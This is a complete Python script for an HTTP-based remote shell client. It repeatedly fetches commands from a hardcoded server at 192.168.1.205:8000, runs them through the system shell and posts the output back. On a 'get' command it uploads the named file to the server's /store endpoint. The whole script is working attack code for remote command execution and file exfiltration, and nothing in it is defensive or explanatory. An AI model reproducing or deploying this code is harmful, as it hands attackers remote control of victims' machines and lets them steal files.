#!/usr/bin/env python3

import requests
import subprocess
import os

SERVER_IPADDR = "192.168.1.205"
PORT = "8000"
URL_STRING = "http://{}:{}".format(SERVER_IPADDR, PORT)

def web_client():
    while True:
        getResponse = requests.get(URL_STRING)
        evilCommand = getResponse.text

        if 'terminate' in evilCommand:
            break
        
        elif 'get' in evilCommand:
            getString, filename = evilCommand.split("*")
            if os.path.exists(filename):
                url_toProcessFile = URL_STRING+"/store"
                fileObject = {"file": open(filename,"rb")}
                r = requests.post(url_toProcessFile,files=fileObject)
            else:
                postResponse = requests.post(URL_STRING,data="File Not Found")
        
        else:
            shellObject = subprocess.Popen(evilCommand, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            postResponse = requests.post(URL_STRING,data=shellObject.stdout.read())
            postResponse = requests.post(URL_STRING,data=shellObject.stderr.read())

if __name__ == "__main__":
    web_client()